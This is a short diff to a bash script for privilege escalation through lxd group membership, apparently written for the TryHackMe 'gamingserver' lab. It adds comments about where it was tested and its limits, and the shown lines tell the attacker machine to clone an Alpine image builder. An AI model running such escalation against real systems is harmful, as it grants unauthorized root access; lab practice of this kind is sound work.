@@ -1,6 +1,10 @@
 #!/bin/bash
+
+#Tested on the room gamingserver on TryHackMe
 #Transfer this file on the victim machine
 #Our user must be part of the lxd group
+#In some cases it may not spawn a root shell
+
 cd /tmp
 echo "Execute the following commands on the attacker machine:"
 echo "git clone https://github.com/saghul/lxd-alpine-builder.git"
